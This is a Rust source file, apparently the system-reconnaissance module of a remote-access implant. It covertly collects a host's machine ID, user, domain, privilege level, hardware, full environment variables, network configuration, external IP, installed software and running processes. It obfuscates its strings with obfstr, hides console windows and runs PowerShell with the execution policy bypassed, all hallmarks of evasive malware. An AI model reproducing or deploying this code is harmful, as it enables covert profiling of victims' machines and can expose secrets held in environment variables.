// src/utils/sys_info.rs

use crate::model::base::SystemInfo;
use crate::utils::base::sha256;
use obfstr::obfstr;
use std::net::UdpSocket;
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};

#[cfg(windows)]
use std::os::windows::process::CommandExt;
#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x08000000;

// ════════════════════════════════════════════════
// 命令执行核心
// ════════════════════════════════════════════════

fn run_cmd(program: &str, args: &[&str]) -> Option<String> {
    let mut cmd = Command::new(program);
    cmd.args(args);
    #[cfg(windows)]
    cmd.creation_flags(CREATE_NO_WINDOW);

    let bytes = cmd.output().ok()?.stdout;
    if bytes.is_empty() {
        return None;
    }
    let decoded = decode_output(&bytes);
    let s = decoded.trim().to_string();
    if s.is_empty() { None } else { Some(s) }
}

#[cfg(windows)]
fn decode_output(bytes: &[u8]) -> String {
    // 有效 UTF-8 / 带 BOM 均直接处理
    if let Ok(s) = std::str::from_utf8(bytes) {
        return s.trim_start_matches('\u{feff}').to_string();
    }
    decode_ansi(bytes)
}

#[cfg(not(windows))]
#[inline]
fn decode_output(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes).into_owned()
}

/// ANSI (CP_ACP) → UTF-16 → UTF-8，解决 GBK/CP936 乱码
#[cfg(windows)]
fn decode_ansi(bytes: &[u8]) -> String {
    use windows_sys::Win32::Globalization::{CP_ACP, MB_PRECOMPOSED, MultiByteToWideChar};
    if bytes.is_empty() {
        return String::new();
    }
    unsafe {
        let len = MultiByteToWideChar(
            CP_ACP,
            MB_PRECOMPOSED,
            bytes.as_ptr(),
            bytes.len() as i32,
            std::ptr::null_mut(),
            0,
        );
        if len == 0 {
            return String::from_utf8_lossy(bytes).into_owned();
        }
        let mut wide = vec![0u16; len as usize];
        MultiByteToWideChar(
            CP_ACP,
            MB_PRECOMPOSED,
            bytes.as_ptr(),
            bytes.len() as i32,
            wide.as_mut_ptr(),
            len,
        );
        String::from_utf16_lossy(&wide)
    }
}

#[cfg(windows)]
fn run_powershell(script: &str) -> Option<String> {
    let wrapped = format!(
        "{}{}",
        obfstr!(
            "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;\
                          $OutputEncoding=[System.Text.Encoding]::UTF8; "
        ),
        script
    );
    let mut cmd = Command::new(obfstr!("powershell"));
    cmd.args(&[
        obfstr!("-NoProfile"),
        obfstr!("-NonInteractive"),
        obfstr!("-ExecutionPolicy"),
        obfstr!("Bypass"),
        obfstr!("-Command"),
        &wrapped,
    ]);
    cmd.creation_flags(CREATE_NO_WINDOW);
    let bytes = cmd.output().ok()?.stdout;
    let s = String::from_utf8_lossy(&bytes)
        .trim_start_matches('\u{feff}')
        .trim()
        .to_string();
    if s.is_empty() { None } else { Some(s) }
}

// ════════════════════════════════════════════════
// 入口
// ════════════════════════════════════════════════

pub fn collect_system_info_full() -> SystemInfo {
    SystemInfo {
        timestamp: collect_timestamp(),
        uuid: collect_uuid(),
        hostname: collect_hostname(),
        username: collect_username(),
        domain: collect_domain(),
        pid: collect_pid(),
        process_path: collect_process_path(),
        user_permissions: collect_user_permissions(),
        os: collect_os(),
        os_version: collect_os_version(),
        os_build: collect_os_build(),
        arch: collect_arch(),
        cpu: collect_cpu(),
        memory: collect_memory(),
        disk: collect_disk(),
        graphics_cards: collect_graphics_cards(),
        systeminfo: collect_systeminfo_raw(),
        env: collect_env(),
        local_ip: collect_local_ip(),
        external_ip: collect_external_ip(),
        network_info: collect_network_info(),
        installed_software: collect_installed_software(),
        running_processes: collect_running_processes(),
    }
}
pub fn collect_system_info() -> SystemInfo {
    SystemInfo {
        timestamp: collect_timestamp(),
        uuid: collect_uuid(),
        hostname: collect_hostname(),
        username: collect_username(),
        domain: collect_domain(),
        pid: collect_pid(),
        process_path: collect_process_path(),
        user_permissions: collect_user_permissions(),
        os: collect_os(),
        os_version: collect_os_version(),
        os_build: None,
        arch: collect_arch(),
        cpu: collect_cpu(),
        memory: collect_memory(),
        disk: collect_disk(),
        graphics_cards: None,
        systeminfo: None,
        env: collect_env(),
        local_ip: collect_local_ip(),
        external_ip: None,
        network_info: collect_network_info(),
        installed_software: None,
        running_processes: None,
    }
}

// ════════════════════════════════════════════════
// 身份标识
// ════════════════════════════════════════════════

fn collect_timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn collect_uuid() -> String {
    let raw: String = {
        #[cfg(target_os = "linux")]
        {
            std::fs::read_to_string(obfstr!("/etc/machine-id")).unwrap_or_default()
        }
        #[cfg(target_os = "macos")]
        {
            run_cmd(
                obfstr!("ioreg"),
                &[
                    obfstr!("-rd1"),
                    obfstr!("-c"),
                    obfstr!("IOPlatformExpertDevice"),
                ],
            )
            .unwrap_or_default()
        }
        #[cfg(windows)]
        {
            read_registry_string(
                obfstr!("SOFTWARE\\Microsoft\\Cryptography"),
                obfstr!("MachineGuid"),
            )
            .unwrap_or_default()
        }
        #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
        {
            String::new()
        }
    };

    if raw.is_empty() {
        uuid::Uuid::new_v4()
            .to_string()
            .replace('-', "")
            .to_uppercase()
    } else {
        sha256(raw.trim().as_bytes())[..32].to_uppercase()
    }
}

fn collect_hostname() -> String {
    whoami::fallible::hostname().unwrap_or_else(|_| obfstr!("unknown").to_string())
}

fn collect_username() -> String {
    whoami::username()
}

fn collect_domain() -> Option<String> {
    #[cfg(windows)]
    {
        // 环境变量最快，且值本身不含敏感路径
        if let Ok(d) = std::env::var(obfstr!("USERDOMAIN")) {
            if d.to_uppercase() != collect_hostname().to_uppercase() {
                return Some(d);
            }
        }
        // wmic 输出为纯 ASCII，run_cmd 即可
        run_cmd(
            obfstr!("wmic"),
            &[
                obfstr!("computersystem"),
                obfstr!("get"),
                obfstr!("domain"),
                obfstr!("/value"),
            ],
        )
        .and_then(|s| parse_wmic_value(&s, obfstr!("Domain")))
        .filter(|d| !d.eq_ignore_ascii_case(obfstr!("WORKGROUP")))
    }
    #[cfg(not(windows))]
    {
        run_cmd(obfstr!("hostname"), &[obfstr!("-d")])
            .filter(|s| !s.is_empty() && s != obfstr!("(none)"))
    }
}

fn collect_pid() -> u32 {
    std::process::id()
}

fn collect_process_path() -> String {
    std::env::current_exe()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| obfstr!("unknown").to_string())
}

fn collect_user_permissions() -> String {
    #[cfg(windows)]
    {
        collect_windows_integrity_level()
    }
    #[cfg(not(windows))]
    {
        collect_unix_privileges()
    }
}

#[cfg(windows)]
fn collect_windows_integrity_level() -> String {
    if let Some(out) = run_cmd(obfstr!("whoami"), &[obfstr!("/groups")]) {
        // SID 是纯 ASCII，不受乱码影响
        if out.contains(obfstr!("S-1-16-16384")) {
            return obfstr!("system").to_string();
        }
        if out.contains(obfstr!("S-1-16-12288")) {
            return obfstr!("high_integrity").to_string();
        }
        if out.contains(obfstr!("S-1-16-8192")) {
            return obfstr!("medium_integrity").to_string();
        }
        if out.contains(obfstr!("S-1-16-4096")) {
            return obfstr!("low_integrity").to_string();
        }
    }
    obfstr!("user").to_string()
}

#[cfg(not(windows))]
fn collect_unix_privileges() -> String {
    let euid = unsafe { libc::geteuid() };
    if euid == 0 {
        return obfstr!("root").to_string();
    }
    if let Some(g) = run_cmd(obfstr!("id"), &[]) {
        if g.contains(obfstr!("sudo")) || g.contains(obfstr!("wheel")) {
            return obfstr!("sudo_user").to_string();
        }
    }
    obfstr!("user").to_string()
}

// ════════════════════════════════════════════════
// 系统信息
// ════════════════════════════════════════════════

fn collect_os() -> String {
    std::env::consts::OS.to_string()
}

fn collect_os_version() -> String {
    let info = os_info::get();
    format!("{} {}", info.os_type(), info.version())
}

fn collect_os_build() -> Option<String> {
    #[cfg(windows)]
    {
        read_registry_string(
            obfstr!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"),
            obfstr!("CurrentBuildNumber"),
        )
    }
    #[cfg(target_os = "linux")]
    {
        run_cmd(obfstr!("uname"), &[obfstr!("-r")])
    }
    #[cfg(target_os = "macos")]
    {
        run_cmd(obfstr!("sw_vers"), &[obfstr!("-buildVersion")])
    }
    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        None
    }
}

fn collect_arch() -> String {
    std::env::consts::ARCH.to_string()
}

fn collect_cpu() -> String {
    #[cfg(windows)]
    {
        // 注册表值为 UTF-16LE，winreg 已转好，无乱码
        read_registry_string(
            obfstr!("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"),
            obfstr!("ProcessorNameString"),
        )
        .unwrap_or_else(|| {
            run_cmd(
                obfstr!("wmic"),
                &[
                    obfstr!("cpu"),
                    obfstr!("get"),
                    obfstr!("Name"),
                    obfstr!("/value"),
                ],
            )
            .and_then(|s| parse_wmic_value(&s, obfstr!("Name")))
            .unwrap_or_else(|| obfstr!("unknown").to_string())
        })
    }
    #[cfg(target_os = "linux")]
    {
        std::fs::read_to_string(obfstr!("/proc/cpuinfo"))
            .ok()
            .and_then(|s| {
                s.lines()
                    .find(|l| l.starts_with(obfstr!("model name")))
                    .and_then(|l| l.split(':').nth(1))
                    .map(|s| s.trim().to_string())
            })
            .unwrap_or_else(|| obfstr!("unknown").to_string())
    }
    #[cfg(target_os = "macos")]
    {
        run_cmd(
            obfstr!("sysctl"),
            &[obfstr!("-n"), obfstr!("machdep.cpu.brand_string")],
        )
        .unwrap_or_else(|| obfstr!("unknown").to_string())
    }
    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        obfstr!("unknown").to_string()
    }
}

fn collect_memory() -> String {
    #[cfg(windows)]
    {
        // wmic 数值输出全为 ASCII
        let total = run_cmd(
            obfstr!("wmic"),
            &[
                obfstr!("ComputerSystem"),
                obfstr!("get"),
                obfstr!("TotalPhysicalMemory"),
                obfstr!("/value"),
            ],
        )
        .and_then(|s| parse_wmic_value(&s, obfstr!("TotalPhysicalMemory")))
        .and_then(|v| v.parse::<u64>().ok())
        .map(|b| format!("{:.1} GB", b as f64 / 1_073_741_824.0))
        .unwrap_or_else(|| obfstr!("unknown").to_string());

        let avail = run_cmd(
            obfstr!("wmic"),
            &[
                obfstr!("OS"),
                obfstr!("get"),
                obfstr!("FreePhysicalMemory"),
                obfstr!("/value"),
            ],
        )
        .and_then(|s| parse_wmic_value(&s, obfstr!("FreePhysicalMemory")))
        .and_then(|v| v.parse::<u64>().ok())
        .map(|kb| format!("{:.1} GB free", kb as f64 / 1_048_576.0))
        .unwrap_or_default();

        format!("{} / {}", total, avail)
    }
    #[cfg(target_os = "linux")]
    {
        std::fs::read_to_string(obfstr!("/proc/meminfo"))
            .ok()
            .map(|s| {
                format!(
                    "Total: {} / Available: {}",
                    extract_meminfo(&s, obfstr!("MemTotal")),
                    extract_meminfo(&s, obfstr!("MemAvailable")),
                )
            })
            .unwrap_or_else(|| obfstr!("unknown").to_string())
    }
    #[cfg(target_os = "macos")]
    {
        run_cmd(obfstr!("sysctl"), &[obfstr!("-n"), obfstr!("hw.memsize")])
            .and_then(|s| s.parse::<u64>().ok())
            .map(|b| format!("{:.1} GB", b as f64 / 1_073_741_824.0))
            .unwrap_or_else(|| obfstr!("unknown").to_string())
    }
    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        obfstr!("unknown").to_string()
    }
}

fn collect_disk() -> String {
    #[cfg(windows)]
    {
        run_cmd(
            obfstr!("wmic"),
            &[
                obfstr!("logicaldisk"),
                obfstr!("get"),
                obfstr!("Caption,Size,FreeSpace,FileSystem"),
                obfstr!("/format:csv"),
            ],
        )
        .unwrap_or_else(|| obfstr!("unknown").to_string())
    }
    #[cfg(not(windows))]
    {
        run_cmd(obfstr!("df"), &[obfstr!("-h")]).unwrap_or_else(|| obfstr!("unknown").to_string())
    }
}

fn collect_graphics_cards() -> Option<String> {
    #[cfg(windows)]
    {
        // 优先使用 PowerShell（可靠，支持多显卡）
        if let Some(out) = run_powershell(obfstr!(
            "Get-CimInstance Win32_VideoController |
                 Select-Object Caption, Name, AdapterRAM, DriverVersion |
                 Format-Table -AutoSize | Out-String -Width 300"
        )) {
            let s = out.trim().to_string();
            if !s.is_empty() && !s.contains("No Instance(s) Found") {
                return Some(s);
            }
        }

        // PowerShell 失败时回退到 wmic（获取所有 Caption）
        run_cmd(
            obfstr!("wmic"),
            &[
                obfstr!("path"),
                obfstr!("win32_videocontroller"),
                obfstr!("get"),
                obfstr!("Caption"),
                obfstr!("/value"),
            ],
        )
        .and_then(|s| {
            // 可能有多行 Caption=xxx
            let captions: Vec<String> = s
                .lines()
                .filter_map(|line| parse_wmic_value(line, obfstr!("Caption")))
                .filter(|v| !v.trim().is_empty() && !v.eq_ignore_ascii_case("No Instance(s) Found"))
                .collect();

            if captions.is_empty() {
                None
            } else {
                Some(captions.join("\n"))
            }
        })
    }

    #[cfg(target_os = "linux")]
    {
        run_cmd(obfstr!("lspci"), &[])
            .map(|s| {
                s.lines()
                    .filter(|l| {
                        let lower = l.to_lowercase();
                        (lower.contains("vga")
                            || lower.contains("3d controller")
                            || lower.contains("display controller"))
                            && !lower.contains("usb")
                    })
                    .map(|l| l.trim().to_string())
                    .collect::<Vec<_>>()
                    .join("\n")
            })
            .filter(|s| !s.is_empty())
    }

    #[cfg(target_os = "macos")]
    {
        run_cmd(obfstr!("system_profiler"), &[obfstr!("SPDisplaysDataType")])
    }

    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        None
    }
}

fn collect_systeminfo_raw() -> Option<String> {
    #[cfg(windows)]
    {
        run_cmd(obfstr!("systeminfo"), &[])
    }
    #[cfg(target_os = "linux")]
    {
        run_cmd(obfstr!("hostnamectl"), &[])
    }
    #[cfg(target_os = "macos")]
    {
        run_cmd(
            obfstr!("system_profiler"),
            &[obfstr!("SPSoftwareDataType"), obfstr!("SPHardwareDataType")],
        )
    }
    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        None
    }
}

// ════════════════════════════════════════════════
// 环境 & 网络
// ════════════════════════════════════════════════

fn collect_env() -> String {
    std::env::vars()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect::<Vec<_>>()
        .join("\n")
}

fn collect_local_ip() -> String {
    let mut default = "127.0.0.1".to_string();
    if let Ok(socket) = UdpSocket::bind("0.0.0.0:0") {
        if let Ok(_) = socket.connect("8.8.8.8:53") {
            if let Ok(addr) = socket.local_addr() {
                default = addr.ip().to_string();
            }
        }
    }
    default
}

fn collect_external_ip() -> Option<String> {
    run_cmd(
        obfstr!("curl"),
        &[
            obfstr!("-s"),
            obfstr!("--max-time"),
            obfstr!("5"),
            obfstr!("https://api.ipify.org"),
        ],
    )
    .or_else(|| {
        run_cmd(
            obfstr!("curl"),
            &[
                obfstr!("-s"),
                obfstr!("--max-time"),
                obfstr!("5"),
                obfstr!("https://ifconfig.me"),
            ],
        )
    })
}

fn collect_network_info() -> String {
    #[cfg(windows)]
    {
        run_cmd(obfstr!("ipconfig"), &[obfstr!("/all")])
            .unwrap_or_else(|| obfstr!("unknown").to_string())
    }
    #[cfg(not(windows))]
    {
        run_cmd(obfstr!("ip"), &[obfstr!("addr")])
            .or_else(|| run_cmd(obfstr!("ifconfig"), &[obfstr!("-a")]))
            .unwrap_or_else(|| obfstr!("unknown").to_string())
    }
}

// ════════════════════════════════════════════════
// 进程 & 软件
// ════════════════════════════════════════════════

fn collect_installed_software() -> Option<String> {
    #[cfg(windows)]
    {
        run_powershell(obfstr!(
            "Get-ItemProperty \
             'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | \
             Select-Object DisplayName,DisplayVersion,Publisher | \
             Where-Object {$_.DisplayName} | \
             Format-Table -AutoSize | Out-String -Width 300"
        ))
    }
    #[cfg(target_os = "linux")]
    {
        run_cmd(obfstr!("dpkg"), &[obfstr!("-l")])
            .or_else(|| run_cmd(obfstr!("rpm"), &[obfstr!("-qa")]))
            .or_else(|| run_cmd(obfstr!("pacman"), &[obfstr!("-Q")]))
            .or_else(|| run_cmd(obfstr!("apk"), &[obfstr!("list"), obfstr!("--installed")]))
    }
    #[cfg(target_os = "macos")]
    {
        run_cmd(obfstr!("ls"), &[obfstr!("/Applications")])
    }
    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        None
    }
}

fn collect_running_processes() -> Option<String> {
    #[cfg(windows)]
    {
        run_cmd(
            obfstr!("tasklist"),
            &[obfstr!("/svc"), obfstr!("/fo"), obfstr!("csv")],
        )
    }
    #[cfg(not(windows))]
    {
        run_cmd(obfstr!("ps"), &[obfstr!("auxf")])
            .or_else(|| run_cmd(obfstr!("ps"), &[obfstr!("-ef")]))
    }
}

// ════════════════════════════════════════════════
// 工具函数
// ════════════════════════════════════════════════

/// 解析 `wmic ... /value` 格式：`Key=Value\r\n`
fn parse_wmic_value(output: &str, key: &str) -> Option<String> {
    output
        .lines()
        .find(|l| l.starts_with(key))
        .and_then(|l| l.split('=').nth(1))
        .map(|v| v.trim().trim_matches('\r').to_string())
        .filter(|v| !v.is_empty())
}

/// 从 `/proc/meminfo` 提取 kB 值并转为可读 GB 字符串
fn extract_meminfo(content: &str, key: &str) -> String {
    content
        .lines()
        .find(|l| l.starts_with(key))
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|v| v.parse::<u64>().ok())
        .map(|kb| format!("{:.1} GB", kb as f64 / 1_048_576.0))
        .unwrap_or_else(|| obfstr!("unknown").to_string())
}

#[cfg(windows)]
fn read_registry_string(path: &str, name: &str) -> Option<String> {
    use winreg::RegKey;
    use winreg::enums::HKEY_LOCAL_MACHINE;
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    hklm.open_subkey(path)
        .ok()
        .and_then(|k: winreg::RegKey| k.get_value::<String, _>(name).ok())
}

// ════════════════════════════════════════════════
// 测试
// ════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_collect_system_info() {
        let info = collect_system_info();
        assert!(!info.hostname.is_empty());
        assert!(!info.username.is_empty());
        assert!(info.pid > 0);
        assert!(!info.os.is_empty());
        println!("{:#?}", info);
    }
}
